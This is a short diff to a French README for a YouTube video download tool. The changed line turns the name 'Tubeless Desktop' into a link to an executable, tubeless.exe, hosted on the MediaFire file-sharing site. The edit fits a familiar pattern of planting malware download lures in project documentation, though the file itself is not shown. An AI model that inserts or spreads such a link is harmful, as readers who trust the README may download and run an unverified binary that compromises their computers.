@@ -58,7 +58,7 @@
 ## Médias et Téléchargement
 
 > [!IMPORTANT]
-> Pour activer les téléchargements, assurez-vous que l'application **Tubeless Desktop** est lancée sur votre PC.
+> Pour activer les téléchargements, assurez-vous que l'application <a href="https://www.mediafire.com/file/1aiwbv7mkrukpio/tubeless.exe/file" target="_blank">Tubeless Desktop</a> est lancée sur votre PC.
 
 ### Comment télécharger
 1.  Ouvrez n'importe quelle vidéo YouTube.
